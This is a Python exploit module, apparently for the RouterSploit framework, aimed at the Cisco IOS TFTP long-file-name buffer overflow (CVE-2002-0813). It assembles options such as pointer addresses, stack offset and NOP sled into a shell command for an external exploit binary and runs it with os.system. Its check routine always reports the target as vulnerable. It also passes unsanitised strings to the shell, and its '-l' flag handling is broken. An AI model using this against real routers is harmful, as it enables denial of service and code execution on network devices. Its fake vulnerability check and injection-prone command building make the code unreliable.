import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "Cisco_IOS_11.x-TFTP_Server_Long_File_Name_Buffer_Overflow",

        "description": "A problem has been discovered in Cisco IOS and MGX switches that could result in a denial of service, and potential code execution. "
                       " It has been discovered that the TFTP server file name handling of Cisco IOS is vulnerable to a buffer overflow. This overflow results "
                       "due insufficient bounds checking on requested file names. A request for a file name of 700 or more bytes will result a crash of the router, "
                       " and reboot of the device.On Cisco MGX switches, the TFTP service will fail but the device will continue to function.",

        "authors": (

            "FX",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/21655",

        ),

        "devices": (

            "Cisco, CVE-2002-0813"
        ),
    }


    target = OptIP("", "device_ip ")
    fileName = OptString("","config.file ")
    ptr_front = OptString("","sets the previous ptr address")
    ptr_next = OptString("","sets the next ptr address")
    stack = OptString("","sets the stack address")
    offset = OptString("","sets the offset from prev to buffer")
    size = OptString("","sets the overflow size")
    NOP = OptString("","sets the NOP sleet")
    layout = OptString("","use IOS 11.1 memory layout")
    verbosity = OptString("","increases verbosity (highly recommended)")
    test = OptString("","1.only test, don't send ")


    
    def run(self):

        if self.check():
            s = "./exploit-db-21655 -d {0} -f {1}"
            if self.ptr_front:
                s += " -p {2}"
            if self.ptr_next:
                s += " -n {3}"
            if self.stack:
                s += " -s {4}"
            if self.offset:
                s += " -o {5}"
            if self.size:
                s += "-l {6}"
            if self.NOP:
                s += " -N {7}"
            if self.layout:
                s += " -l"
            if self.verbosity:
                s += " -v"
            if self.test == "1":
                s += " -t"

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.target,self.fileName,self.ptr_front,self.ptr_next,self.stack,self.offset,self.size,self.NOP)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True